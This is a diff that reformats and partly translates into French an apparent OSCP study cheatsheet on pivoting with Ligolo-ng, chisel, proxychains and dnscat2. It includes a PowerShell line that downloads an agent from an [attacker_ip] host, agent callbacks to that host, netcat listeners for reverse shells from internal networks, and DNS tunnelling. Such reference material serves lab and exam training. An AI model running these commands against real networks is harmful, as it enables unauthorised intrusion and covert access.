@@ -8,48 +8,19 @@ description: "Référence des outils de tunnel et des modes de transport réseau
 Référence des outils de tunnel et des modes de transport réseau.
 
 
-## Ligolo (Direct Subnetting)
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ### Tunnel simple
 
 Configurer et comprendre les chemins de communication réseau.
 
-
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_tunnel.png)
 
 
-```text
-X.X.X.X
-```
+**Paramètres et repères :**
+`X.X.X.X` · `Y.Y.Y.Y` · `X.X.X.X/` · `255.255.255.0`  
+`/24`  
 
 
-```text
-Y.Y.Y.Y
-```
-
-
-```text
-X.X.X.X/
-```
-
-
-```text
-255.255.255.0
-```
-
-
-```text
-/24
-```
-
-
-```text
-ligolo
-```
-
+Commande `ip` pour la rubrique « Tunnel simple ».
 
 ```bash
 sudo ip tuntap add user [kali_user] mode tun ligolo
@@ -58,26 +29,34 @@ sudo ip link set ligolo up
 ```
 
 
+Commande `./ligolo_proxy_linux` pour la rubrique « Tunnel simple ».
+
 ```bash
 # The option -selfcert is for not using a certificate (this will make our communications in clear text), we do not need to encrypt them for the exam.
 ./ligolo_proxy_linux -selfcert
-or
+# Autre possibilité
 ./ligolo_proxy_linux -selfcert -port <DIFFERENT_PROXY_PORT>
 ```
 
+
+Commande `iwr` pour la rubrique « Tunnel simple ».
 
 ```powershell
 iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe
 ```
 
 
+Commande `./ligolo_agent_windows.exe` pour la rubrique « Tunnel simple ».
+
 ```powershell
 # The port is the default one, we could also change it if needed.
 ./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert
-or
+# Autre possibilité
 ./ligolo_agent_windows.exe -connect [attacker_ip]:<DIFFERENT_PROXY_PORT> -ignore-cert
 ```
 
+
+Commande `ip` pour la rubrique « Tunnel simple ».
 
 ```bash
 # Run this command in other terminal that from the one where ligolo proxy is running
@@ -87,6 +66,8 @@ sudo ip route add [internal_submask]/24 dev ligolo
 ip route list
 ```
 
+
+Exemple technique pour la rubrique « Tunnel simple ».
 
 ```bash
 # Run this commands in the ligolo proxy terminal
@@ -101,9 +82,10 @@ ip route list
 
 Configurer et comprendre les chemins de communication réseau.
 
-
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_double_tunnel.png)
 
+
+Commande `ip` pour la rubrique « Double tunnel ».
 
 ```bash
 sudo ip tuntap add user [kali_user] mode tun ligolo_double
@@ -111,6 +93,8 @@ sudo ip tuntap add user [kali_user] mode tun ligolo_double
 sudo ip link set ligolo_double up
 ```
 
+
+Commande `listener_add` pour la rubrique « Double tunnel ».
 
 ```bash
 # The next step is to add a listener on port 11601 to our existing Ligolo session and redirect it to our machine. 
@@ -120,33 +104,31 @@ listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 listener_list
 ```
 
-
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_01.png)
 
+
+Commande `./agent.exe` pour la rubrique « Double tunnel ».
 
 ```powershell
 # Next, we need to execute the agent on the Windows host to connect to the forwarded port on our attacker machine
 ./agent.exe -connect <IP of First Pivot Point>:11601 -ignore-cert
 ```
 
-
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_02.png)
-
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_03.png)
 
+
+Commande `ip` pour la rubrique « Double tunnel ».
 
 ```bash
 # Our last step is to change our session to the second pivot point (Windows), start the tunnel, and then add a route to the newly discovered network at 10.1.30.0/24.
 sudo ip add route <New_Network> dev ligolo_double
 ```
 
-
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_04.png)
 
-
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_05.png)
-
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_06.png)
 
@@ -156,25 +138,7 @@ sudo ip add route <New_Network> dev ligolo_double
 Vérifier les ports et les services de la cible autorisée.
 
 
-```text
-Ligolo-ng
-```
-
-
-```text
-Ligolo-ng
-```
-
-
-```text
-ligolo
-```
-
-
-```text
-Ligolo-ng
-```
-
+Commande `ip` pour la rubrique « Local Redirection de ports ».
 
 ```bash
 # Add a special hardcoded IP for local port forwarding.
@@ -182,30 +146,22 @@ sudo ip route add 240.0.0.1/32 dev ligolo
 ```
 
 
-```text
-240.0.0.1/32
-```
+**Paramètres et repères :**
+`240.0.0.1/32`  
 
 
-```text
-Ligolo-ng
-```
-
-
-```text
-ligolo
-```
-
+Commande `dev` pour la rubrique « Local Redirection de ports ».
 
 ```text
 dev ligolo
 ```
 
 
-```text
-240.0.0.1
-```
+**Paramètres et repères :**
+`240.0.0.1`  
 
+
+Exemple technique pour la rubrique « Local Redirection de ports ».
 
 ```bash
 ┌──(kali㉿Kali)-[~]  
@@ -219,39 +175,39 @@ PORT STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_port_forwarding.png)
 
 
 ### Reverse Shells From Internal Networks
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Tester ou établir une connexion réseau avec Netcat.
 
 ```bash
 nc -nvlp [kali_port]
 ```
 
 
+Commande `listener_add` pour la rubrique « Reverse Shells From Internal Networks ».
+
 ```bash
 listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
 ```
 
-
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_10.png)
 
 
-```bash
-msfvenom
-```
+**Paramètres et repères :**
+`msfvenom`  
 
+
+Exemple technique pour la rubrique « Reverse Shells From Internal Networks ».
 
 ```bash
 [command_to_run_reverse_shell] -L [kali_ip]:[kali_port]
-or
+# Autre possibilité
 ./payload.exe
 ```
-
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_11.png)
 
@@ -261,26 +217,29 @@ or
 Transférer ou récupérer des fichiers dans le laboratoire.
 
 
+Commande `listener_add` pour la rubrique « Transfert de fichiers From Internal Networks ».
+
 ```bash
 listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
 ```
 
-
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_07.png)
 
+
+Commande `python3` pour la rubrique « Transfert de fichiers From Internal Networks ».
 
 ```bash
 python3 -m http.server [kali_port]
 ```
 
-
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_08.png)
 
+
+Commande `invoke-webrequest` pour la rubrique « Transfert de fichiers From Internal Networks ».
 
 ```powershell
 Invoke-WebRequest -Uri "http://[agent_ip]:[agent_port]/[file_name]" -OutFile [file_name]
 ```
-
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_09.png)
 
@@ -294,6 +253,8 @@ Examiner les entrées et les réponses de l'application web.
 
 Vérifier les ports et les services de la cible autorisée.
 
+
+Commande `chisel` pour la rubrique « Redirection de ports ».
 
 ```bash
 # In remote machine
@@ -309,6 +270,8 @@ chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>
 Vérifier les ports et les services de la cible autorisée.
 
 
+Commande `chisel` pour la rubrique « Redirection inversée de ports ».
+
 ```bash
 # In local machine
 chisel server -p <LOCAL_PORT> --reverse
@@ -320,6 +283,8 @@ chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE
 ```
 
 
+Récupérer une ressource distante ou une réponse HTTP.
+
 ```bash
 curl http://localhost:<LOCAL_FORWARD_PORT>
 
@@ -327,10 +292,12 @@ curl http://localhost:<LOCAL_FORWARD_PORT>
 ```
 
 
-### Forward Dynamic SOCKS Proxy
+### Proxy SOCKS dynamique
 
 Configurer et comprendre les chemins de communication réseau.
 
+
+Commande `chisel` pour la rubrique « Proxy SOCKS dynamique ».
 
 ```bash
 # In remote
@@ -343,10 +310,11 @@ chisel client <REMOTE_IP>:<REMOTE_PORT> <LOCAL_PORT>:socks
 ```
 
 
-```text
-/etc/proxychains.conf
-```
+**Paramètres et repères :**
+`/etc/proxychains.conf`  
 
+
+Commande `...` pour la rubrique « Proxy SOCKS dynamique ».
 
 ```bash
 # Comment out the line of "socks4"
@@ -357,10 +325,12 @@ socks5 127.0.0.1 <LOCAL_PORT>
 ```
 
 
-### Reverse Dynamic SOCKS Proxy
+### Proxy SOCKS inverse
 
 Configurer et comprendre les chemins de communication réseau.
 
+
+Commande `chisel` pour la rubrique « Proxy SOCKS inverse ».
 
 ```bash
 # In local machine
@@ -373,10 +343,11 @@ chisel client <LOCAL_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:socks
 ```
 
 
-```text
-/etc/proxychains.conf
-```
+**Paramètres et repères :**
+`/etc/proxychains.conf`  
 
+
+Commande `...` pour la rubrique « Proxy SOCKS inverse ».
 
 ```bash
 # /etc/proxychains.conf
@@ -385,10 +356,7 @@ socks5 127.0.0.1 <REMOTE_PORT>
 ```
 
 
-```text
-proxychains
-```
-
+Commande `proxychains` pour la rubrique « Proxy SOCKS inverse ».
 
 ```bash
 proxychains nmap localhost
@@ -400,10 +368,11 @@ proxychains nmap localhost
 Interroger les enregistrements DNS et identifier les services associés.
 
 
-```text
-dnscat2
-```
+**Paramètres et repères :**
+`dnscat2`  
 
+
+Commande `dnscat2-server` pour la rubrique « Dnscat2 (DNS Tunneling) ».
 
 ```bash
 # Replace [domain] with the chosen domain
@@ -411,10 +380,11 @@ dnscat2-server [domain]
 ```
 
 
-```text
-dnscat2
-```
+**Paramètres et repères :**
+`dnscat2`  
 
+
+Commande `./dnscat` pour la rubrique « Dnscat2 (DNS Tunneling) ».
 
 ```bash
 # With domain
@@ -425,10 +395,11 @@ dnscat2
 ```
 
 
-```text
-dnscat2
-```
+**Paramètres et repères :**
+`dnscat2`  
 
+
+Commande `dnscat2` pour la rubrique « Dnscat2 (DNS Tunneling) ».
 
 ```bash
 dnscat2> windows
@@ -436,27 +407,30 @@ dnscat2> window -i [session_id]
 ```
 
 
-```text
-dnscat2
-```
+**Paramètres et repères :**
+`dnscat2`  
 
+
+Commande `command` pour la rubrique « Dnscat2 (DNS Tunneling) ».
 
 ```bash
 command ([session_name]) > listen 127.0.0.1:[local_port] [target_ip]:[target_port]
 ```
 
 
-```text
-dnscat2
-```
+**Paramètres et repères :**
+`dnscat2`  
 
+
+Énumérer les informations SMB ou RPC.
 
 ```bash
 # Example command
 smbclient -p [local_port] -L //127.0.0.1 -U [username] --password=[password]
 ```
 
-
 ---
 
 Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
+
+<!-- refined-oscp -->
